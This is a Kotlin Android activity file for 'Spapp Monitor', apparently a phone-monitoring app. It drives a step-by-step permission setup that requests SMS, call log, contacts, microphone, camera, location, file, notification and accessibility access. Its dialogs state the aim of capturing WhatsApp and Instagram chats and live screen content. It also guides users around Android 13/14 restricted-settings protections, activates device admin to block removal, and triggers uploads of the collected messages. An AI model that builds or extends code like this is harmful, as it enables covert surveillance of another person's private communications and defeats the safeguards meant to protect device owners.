package com.spapp.monitoring.ui

import android.Manifest
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.content.res.ColorStateList
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.text.format.DateUtils
import android.util.Log
import android.view.View
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.google.android.material.button.MaterialButton
import com.google.firebase.messaging.FirebaseMessaging
import com.spapp.monitoring.R
import com.spapp.monitoring.admin.SpappDeviceAdminReceiver
import com.spapp.monitoring.blocking.AccessibilityStatus
import com.spapp.monitoring.collectors.AppUsageCollector
import com.spapp.monitoring.data.DeviceState
import com.spapp.monitoring.databinding.ActivityMainBinding
import com.spapp.monitoring.fcm.FcmTokenSync
import com.spapp.monitoring.geofence.GeofenceManager
import com.spapp.monitoring.sync.SyncScheduler

/**
 * Main Status & Permission Control Center for Spapp Monitor.
 *
 * Features:
 *  - Smart Step-by-Step Master Button: Dynamically highlights the next required
 *    permission without infinite recursive loops or trapped resume cycles.
 *  - Full Android 13/14 Restricted Settings support with 1-tap App Info shortcut.
 *  - Complete Permission Checklist with live status badges.
 */
class MainActivity : AppCompatActivity() {

    private lateinit var binding: ActivityMainBinding
    private lateinit var usageCollector: AppUsageCollector
    private lateinit var geofenceManager: GeofenceManager
    private lateinit var deviceState: DeviceState
    private var isOneTapFlowRunning = false
    private var autostartPrompted = false

    private val runtimePermissionsLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { results ->
        refreshPermissionStatus()
        if (results[Manifest.permission.READ_CALL_LOG] == true) {
            com.spapp.monitoring.collectors.RealtimeLogObserverManager.start(applicationContext)
            SyncScheduler.runOnce(applicationContext)
        }
        val grantedCount = results.values.count { it }
        Toast.makeText(this, "$grantedCount permissions updated", Toast.LENGTH_SHORT).show()
        if (isOneTapFlowRunning) {
            handleNextSetupStep()
        }
    }

    private val batteryExemptionLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        refreshPermissionStatus()
        if (isOneTapFlowRunning) {
            if (isBatteryExempted()) {
                handleNextSetupStep()
            } else {
                isOneTapFlowRunning = false
            }
        }
    }

    private val allFilesLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        refreshPermissionStatus()
        if (isOneTapFlowRunning) {
            if (isFileAccessGranted()) {
                handleNextSetupStep()
            } else {
                isOneTapFlowRunning = false
            }
        }
    }

    private val notificationListenerLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        refreshPermissionStatus()
        if (isOneTapFlowRunning) {
            if (isNotificationAccessGranted()) {
                handleNextSetupStep()
            } else {
                isOneTapFlowRunning = false
            }
        }
    }

    private val accessibilityLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        refreshPermissionStatus()
        if (isOneTapFlowRunning) {
            if (isAccessibilityEnabled()) {
                handleNextSetupStep()
            } else {
                isOneTapFlowRunning = false
            }
        }
    }

    private val usageLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        refreshPermissionStatus()
        if (isOneTapFlowRunning) {
            if (isUsageAccessGranted()) {
                handleNextSetupStep()
            } else {
                isOneTapFlowRunning = false
            }
        }
    }

    private val deviceAdminLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        refreshPermissionStatus()
        if (isOneTapFlowRunning) {
            if (isDeviceAdminActive()) {
                handleNextSetupStep()
            } else {
                isOneTapFlowRunning = false
            }
        }
    }

    private val autostartLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        refreshPermissionStatus()
        if (isOneTapFlowRunning) {
            handleNextSetupStep()
        }
    }

    private val statusHandler = Handler(Looper.getMainLooper())
    private val statusUpdater = object : Runnable {
        override fun run() {
            updateSyncStatusText()
            statusHandler.postDelayed(this, STATUS_REFRESH_MS)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        deviceState = DeviceState(this)
        usageCollector = AppUsageCollector(this)
        geofenceManager = GeofenceManager(this)

        SyncScheduler.schedule(applicationContext)
        uploadCurrentFcmToken()
        com.spapp.monitoring.collectors.RealtimeLogObserverManager.start(applicationContext)

        // Master Setup Button (Dynamically executes the full setup sequence continuously)
        binding.btnMasterOneTap.setOnClickListener {
            isOneTapFlowRunning = true
            handleNextSetupStep()
        }

        // Individual permission shortcut listeners
        binding.btnCorePermStatus.setOnClickListener {
            isOneTapFlowRunning = false
            val missing = getMissingRuntimePermissions()
            if (missing.isNotEmpty()) {
                runtimePermissionsLauncher.launch(missing.toTypedArray())
            } else {
                Toast.makeText(this, "Core permissions already active ✓", Toast.LENGTH_SHORT).show()
            }
        }

        binding.btnBatteryPermStatus.setOnClickListener {
            isOneTapFlowRunning = false
            if (!isBatteryExempted()) {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:$packageName")
                }
                batteryExemptionLauncher.launch(intent)
            } else {
                Toast.makeText(this, "Battery optimization already unrestricted ✓", Toast.LENGTH_SHORT).show()
            }
        }

        binding.btnAccessibilityPermStatus.setOnClickListener {
            isOneTapFlowRunning = false
            showAccessibilityDialog()
        }

        binding.btnAccessibilityRestricted.setOnClickListener {
            openAppInfoSettings()
        }

        binding.btnNotificationPermStatus.setOnClickListener {
            isOneTapFlowRunning = false
            showNotificationDialog()
        }

        binding.btnNotificationRestricted.setOnClickListener {
            openAppInfoSettings()
        }

        binding.btnUnlockRestricted.setOnClickListener {
            openAppInfoSettings()
        }

        binding.btnUsagePermStatus.setOnClickListener {
            isOneTapFlowRunning = false
            if (!isUsageAccessGranted()) {
                Toast.makeText(this, "Find Spapp Monitor and toggle Usage Access ON", Toast.LENGTH_SHORT).show()
                usageLauncher.launch(usageCollector.usageAccessSettingsIntent())
            } else {
                Toast.makeText(this, "App usage tracking already active ✓", Toast.LENGTH_SHORT).show()
            }
        }

        binding.btnFilePermStatus.setOnClickListener {
            isOneTapFlowRunning = false
            if (!isFileAccessGranted()) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                        data = Uri.parse("package:$packageName")
                    }
                    allFilesLauncher.launch(intent)
                }
            } else {
                Toast.makeText(this, "File access already granted ✓", Toast.LENGTH_SHORT).show()
            }
        }

        binding.btnAdminPermStatus.setOnClickListener {
            isOneTapFlowRunning = false
            if (!isDeviceAdminActive()) {
                deviceAdminLauncher.launch(SpappDeviceAdminReceiver.activationIntent(this))
            } else {
                Toast.makeText(this, "Device Administrator already active ✓", Toast.LENGTH_SHORT).show()
            }
        }

        binding.btnAutostartPermStatus.setOnClickListener {
            isOneTapFlowRunning = false
            openAutostartSettings()
        }

        binding.btnSyncNow.setOnClickListener {
            com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantWhatsAppUpload(applicationContext)
            com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantInstagramUpload(applicationContext)
            SyncScheduler.runOnce(applicationContext)
            Toast.makeText(this, "Sync triggered", Toast.LENGTH_SHORT).show()
        }
    }

    override fun onResume() {
        super.onResume()
        refreshPermissionStatus()
        statusUpdater.run()
        uploadCurrentFcmToken()
    }

    override fun onPause() {
        super.onPause()
        statusHandler.removeCallbacks(statusUpdater)
    }

    // =========================================================================
    // DYNAMIC NEXT-STEP SETUP WORKFLOW
    // =========================================================================

    private fun handleNextSetupStep() {
        val missingRuntime = getMissingRuntimePermissions()
        if (missingRuntime.isNotEmpty()) {
            runtimePermissionsLauncher.launch(missingRuntime.toTypedArray())
            return
        }

        if (!isBatteryExempted()) {
            try {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:$packageName")
                }
                batteryExemptionLauncher.launch(intent)
                return
            } catch (e: Exception) {
                Log.w(TAG, "Battery ignore optimizations failed", e)
            }
        }

        if (!isFileAccessGranted()) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                try {
                    Toast.makeText(this, "Enable 'Allow access to manage all files', then tap Back", Toast.LENGTH_LONG).show()
                    val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                        data = Uri.parse("package:$packageName")
                    }
                    allFilesLauncher.launch(intent)
                    return
                } catch (e: Exception) {
                    Log.w(TAG, "All files intent failed", e)
                }
            }
        }

        if (!isNotificationAccessGranted()) {
            showNotificationDialog()
            return
        }

        if (!isAccessibilityEnabled()) {
            showAccessibilityDialog()
            return
        }

        if (!isUsageAccessGranted()) {
            try {
                Toast.makeText(this, "Enable Usage Access for Spapp Monitor, then tap Back", Toast.LENGTH_LONG).show()
                val intent = usageCollector.usageAccessSettingsIntent()
                usageLauncher.launch(intent)
                return
            } catch (e: Exception) {
                Log.w(TAG, "Usage access intent failed", e)
            }
        }

        if (!isDeviceAdminActive()) {
            try {
                Toast.makeText(this, "Activate Device Administrator to prevent unauthorized removal, then tap Back", Toast.LENGTH_LONG).show()
                deviceAdminLauncher.launch(SpappDeviceAdminReceiver.activationIntent(this))
                return
            } catch (e: Exception) {
                Log.w(TAG, "Device admin intent failed", e)
            }
        }

        if (isOemRom() && !autostartPrompted) {
            autostartPrompted = true
            val autostartIntent = getAutostartIntent()
            if (autostartIntent != null) {
                try {
                    Toast.makeText(this, "Enable Autostart for Spapp Monitor, then tap Back", Toast.LENGTH_LONG).show()
                    autostartLauncher.launch(autostartIntent)
                    return
                } catch (e: Exception) {
                    Log.w(TAG, "Autostart intent failed", e)
                }
            }
        }

        isOneTapFlowRunning = false
        refreshPermissionStatus()
        Toast.makeText(this, "✓ All permissions configured & active!", Toast.LENGTH_SHORT).show()
    }

    private fun showAccessibilityDialog() {
        val msg = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            "To enable Live Screen & Monitoring:\n\n" +
            "1. Tap 'Go to Settings' -> 'Downloaded apps' -> 'Spapp Monitor' -> Turn ON.\n\n" +
            "⚠️ Android 13/14 Restricted Setting:\n" +
            "If the switch is grayed out, tap 'Allow Restricted' below -> tap 3 vertical dots (top right) -> 'Allow restricted settings' -> then return and turn it ON."
        } else {
            "To enable Live Screen & Monitoring:\n\n" +
            "1. Tap 'Go to Settings' below.\n" +
            "2. Select 'Downloaded apps' or 'Installed services'.\n" +
            "3. Select 'Spapp Monitor' and toggle it ON."
        }

        AlertDialog.Builder(this)
            .setTitle(R.string.accessibility_dialog_title)
            .setMessage(msg)
            .setPositiveButton(R.string.go_to_settings) { _, _ ->
                try {
                    accessibilityLauncher.launch(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
                } catch (e: Exception) {
                    Log.e(TAG, "Cannot open accessibility settings", e)
                    if (isOneTapFlowRunning) handleNextSetupStep()
                }
            }
            .setNeutralButton(R.string.open_app_info) { _, _ ->
                openAppInfoSettings()
            }
            .setNegativeButton(if (isOneTapFlowRunning) "Skip" else "Cancel") { _, _ ->
                if (isOneTapFlowRunning) {
                    handleNextSetupStep()
                }
            }
            .show()
    }

    private fun showNotificationDialog() {
        val msg = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            "To capture WhatsApp & Instagram chat logs:\n\n" +
            "1. Tap 'Go to Settings' -> Find 'Spapp Monitor' -> Toggle ON.\n\n" +
            "⚠️ If blocked ('Restricted setting'): Tap 'Allow Restricted' below -> 3 dots (top right) -> 'Allow restricted settings'."
        } else {
            "To capture WhatsApp & Instagram chat logs:\n\n" +
            "1. Tap 'Go to Settings' below.\n" +
            "2. Find 'Spapp Monitor' and toggle it ON."
        }

        AlertDialog.Builder(this)
            .setTitle("Enable Notification Access")
            .setMessage(msg)
            .setPositiveButton(R.string.go_to_settings) { _, _ ->
                try {
                    notificationListenerLauncher.launch(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
                } catch (e: Exception) {
                    Log.e(TAG, "Cannot open notification listener settings", e)
                    if (isOneTapFlowRunning) handleNextSetupStep()
                }
            }
            .setNeutralButton(R.string.open_app_info) { _, _ ->
                openAppInfoSettings()
            }
            .setNegativeButton(if (isOneTapFlowRunning) "Skip" else "Cancel") { _, _ ->
                if (isOneTapFlowRunning) {
                    handleNextSetupStep()
                }
            }
            .show()
    }

    // =========================================================================
    // PERMISSION STATUS CHECKS & UI REFRESH
    // =========================================================================

    private fun getMissingRuntimePermissions(): List<String> {
        val list = mutableListOf<String>()

        val hasLocation = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
        if (!hasLocation) {
            list.add(Manifest.permission.ACCESS_FINE_LOCATION)
            list.add(Manifest.permission.ACCESS_COARSE_LOCATION)
        }

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            list.add(Manifest.permission.READ_CALL_LOG)
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            list.add(Manifest.permission.READ_CONTACTS)
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            list.add(Manifest.permission.READ_SMS)
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            list.add(Manifest.permission.RECORD_AUDIO)
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            list.add(Manifest.permission.CAMERA)
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
                list.add(Manifest.permission.POST_NOTIFICATIONS)
            }
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) != PackageManager.PERMISSION_GRANTED) {
                list.add(Manifest.permission.READ_MEDIA_IMAGES)
            }
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VIDEO) != PackageManager.PERMISSION_GRANTED) {
                list.add(Manifest.permission.READ_MEDIA_VIDEO)
            }
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_AUDIO) != PackageManager.PERMISSION_GRANTED) {
                list.add(Manifest.permission.READ_MEDIA_AUDIO)
            }
        } else {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                list.add(Manifest.permission.READ_EXTERNAL_STORAGE)
            }
        }

        return list
    }

    private fun isBatteryExempted(): Boolean {
        val powerManager = getSystemService(POWER_SERVICE) as PowerManager
        return powerManager.isIgnoringBatteryOptimizations(packageName)
    }

    private fun isAccessibilityEnabled(): Boolean {
        return AccessibilityStatus.isEnabled(this)
    }

    private fun isNotificationAccessGranted(): Boolean {
        return try {
            val listeners = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
            listeners?.contains(packageName) == true ||
                    androidx.core.app.NotificationManagerCompat.getEnabledListenerPackages(this).contains(packageName)
        } catch (_: Exception) {
            false
        }
    }

    private fun isUsageAccessGranted(): Boolean = usageCollector.hasUsageAccess()

    private fun isFileAccessGranted(): Boolean {
        return Build.VERSION.SDK_INT < Build.VERSION_CODES.R || Environment.isExternalStorageManager()
    }

    private fun isDeviceAdminActive(): Boolean {
        return SpappDeviceAdminReceiver.isActive(this)
    }

    private fun refreshPermissionStatus() {
        val isCore = getMissingRuntimePermissions().isEmpty()
        val isBattery = isBatteryExempted()
        val isAccessibility = isAccessibilityEnabled()
        val isNotification = isNotificationAccessGranted()
        val isUsage = isUsageAccessGranted()
        val isFile = isFileAccessGranted()
        val isAdmin = isDeviceAdminActive()

        // 1. Core Permissions Button
        updateStatusButton(binding.btnCorePermStatus, isCore, "Active ✓", "Grant")

        // 2. Battery Button
        updateStatusButton(binding.btnBatteryPermStatus, isBattery, "Active ✓", "Grant")

        // 3. Accessibility Button
        updateStatusButton(binding.btnAccessibilityPermStatus, isAccessibility, "Active ✓", "Enable")
        binding.btnAccessibilityRestricted.visibility =
            if (!isAccessibility && Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) View.VISIBLE else View.GONE

        // 4. Notification Button
        updateStatusButton(binding.btnNotificationPermStatus, isNotification, "Active ✓", "Enable")
        binding.btnNotificationRestricted.visibility =
            if (!isNotification && Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) View.VISIBLE else View.GONE

        // 5. Usage Access Button
        updateStatusButton(binding.btnUsagePermStatus, isUsage, "Active ✓", "Enable")

        // 6. File Access Button
        updateStatusButton(binding.btnFilePermStatus, isFile, "Active ✓", "Enable")

        // 7. Device Admin Button
        updateStatusButton(binding.btnAdminPermStatus, isAdmin, "Active ✓", "Enable")

        // 8. Autostart (Xiaomi / Vivo / Oppo / Huawei)
        val isOem = isOemRom()
        binding.layoutAutostartPerm.visibility = if (isOem && !isBattery) View.VISIBLE else View.GONE
        binding.dividerAutostart.visibility = if (isOem && !isBattery) View.VISIBLE else View.GONE

        // 9. Android 13+ Restricted Settings Warning Banner
        val needsRestrictedBanner = Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU && (!isAccessibility || !isNotification)
        binding.cardRestrictedBanner.visibility = if (needsRestrictedBanner) View.VISIBLE else View.GONE

        // Calculate total granted count
        var grantedCount = 0
        if (isCore) grantedCount++
        if (isBattery) grantedCount++
        if (isAccessibility) grantedCount++
        if (isNotification) grantedCount++
        if (isUsage) grantedCount++
        if (isFile) grantedCount++
        if (isAdmin) grantedCount++

        val totalCount = 7
        binding.pbPermissions.max = totalCount
        binding.pbPermissions.progress = grantedCount
        binding.tvPermissionsCount.text = "$grantedCount / $totalCount Active"

        if (grantedCount >= totalCount) {
            binding.tvMasterBadge.text = "ALL ACTIVE ✓"
            binding.tvMasterBadge.setTextColor(ContextCompat.getColor(this, R.color.success))
            binding.tvMasterBadge.setBackgroundColor(ContextCompat.getColor(this, R.color.success_bg))
            binding.tvMasterDesc.text = "All background monitoring services are active and running."
            binding.btnMasterOneTap.text = "✓ ALL PERMISSIONS CONFIGURED & ACTIVE"
            binding.btnMasterOneTap.setBackgroundColor(ContextCompat.getColor(this, R.color.success))
            binding.pbPermissions.progressTintList = ColorStateList.valueOf(ContextCompat.getColor(this, R.color.success))
            binding.layoutPermissionsList.visibility = View.GONE
        } else {
            binding.tvMasterBadge.text = "ACTION NEEDED"
            binding.tvMasterBadge.setTextColor(ContextCompat.getColor(this, R.color.danger))
            binding.tvMasterBadge.setBackgroundColor(ContextCompat.getColor(this, R.color.danger_bg))

            val missingRuntime = getMissingRuntimePermissions()
            if (missingRuntime.isNotEmpty()) {
                binding.tvMasterDesc.text = "Tap below to enable all monitoring permissions on this device in 1 tap."
                binding.btnMasterOneTap.text = "⚡ ALLOW ALL PERMISSIONS"
                binding.btnMasterOneTap.setBackgroundColor(ContextCompat.getColor(this, R.color.accent))
                binding.layoutPermissionsList.visibility = View.VISIBLE
            } else {
                binding.tvMasterDesc.text = "Core permissions are active. Tap below to configure the remaining permissions."
                binding.btnMasterOneTap.text = "⚡ CONFIGURE NEXT PERMISSION"
                binding.btnMasterOneTap.setBackgroundColor(ContextCompat.getColor(this, R.color.accent))
                binding.layoutPermissionsList.visibility = View.VISIBLE
            }
            binding.pbPermissions.progressTintList = ColorStateList.valueOf(ContextCompat.getColor(this, R.color.accent))
        }
    }

    private fun updateStatusButton(button: MaterialButton, isGranted: Boolean, grantedText: String, neededText: String) {
        if (isGranted) {
            button.text = grantedText
            button.setTextColor(ContextCompat.getColor(this, R.color.success))
            button.setBackgroundColor(ContextCompat.getColor(this, R.color.success_bg))
            button.strokeColor = ColorStateList.valueOf(ContextCompat.getColor(this, R.color.success))
            button.strokeWidth = 1
        } else {
            button.text = neededText
            button.setTextColor(ContextCompat.getColor(this, R.color.white))
            button.setBackgroundColor(ContextCompat.getColor(this, R.color.accent))
            button.strokeWidth = 0
        }
    }

    private fun isOemRom(): Boolean {
        val manufacturer = Build.MANUFACTURER.lowercase()
        return manufacturer.contains("xiaomi") ||
                manufacturer.contains("redmi") ||
                manufacturer.contains("oppo") ||
                manufacturer.contains("vivo") ||
                manufacturer.contains("huawei") ||
                manufacturer.contains("honor")
    }

    private fun getAutostartIntent(): Intent? {
        val candidates = listOf(
            Intent().setComponent(
                ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity")
            ),
            Intent().setComponent(
                ComponentName("com.letv.android.letvsafe", "com.letv.android.letvsafe.AutobootManageActivity")
            ),
            Intent().setComponent(
                ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.optimize.process.ProtectActivity")
            ),
            Intent().setComponent(
                ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.startup.StartupAppListActivity")
            ),
            Intent().setComponent(
                ComponentName("com.vivo.permissionmanager", "com.vivo.permissionmanager.activity.BgStartUpManagerActivity")
            ),
        )
        for (intent in candidates) {
            if (packageManager.resolveActivity(intent, PackageManager.MATCH_DEFAULT_ONLY) != null) {
                return intent
            }
        }
        return null
    }

    private fun openAutostartSettings() {
        val intent = getAutostartIntent()
        if (intent != null) {
            try {
                autostartLauncher.launch(intent)
                return
            } catch (_: Exception) {}
        }
        openAppInfoSettings()
    }

    private fun openAppInfoSettings() {
        try {
            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = Uri.parse("package:$packageName")
            }
            startActivity(intent)
        } catch (e: Exception) {
            Log.e(TAG, "No app-info settings screen available", e)
        }
    }

    private fun updateSyncStatusText() {
        val lastSync = deviceState.lastSyncAtEpochMs
        binding.statusText.text = if (lastSync == 0L) {
            getString(R.string.sync_status_never)
        } else {
            val relative = DateUtils.getRelativeTimeSpanString(
                lastSync, System.currentTimeMillis(), DateUtils.MINUTE_IN_MILLIS
            )
            getString(R.string.sync_status_last_synced, relative)
        }
    }

    private fun uploadCurrentFcmToken() {
        FirebaseMessaging.getInstance().token
            .addOnSuccessListener { token ->
                Log.d(TAG, "FCM token fetched: $token")
                FcmTokenSync.enqueueUpload(applicationContext, token)
            }
            .addOnFailureListener { e ->
                Log.e(TAG, "FCM token fetch failed", e)
            }
    }

    companion object {
        private const val TAG = "MainActivity"
        private const val STATUS_REFRESH_MS = 30_000L
    }
}
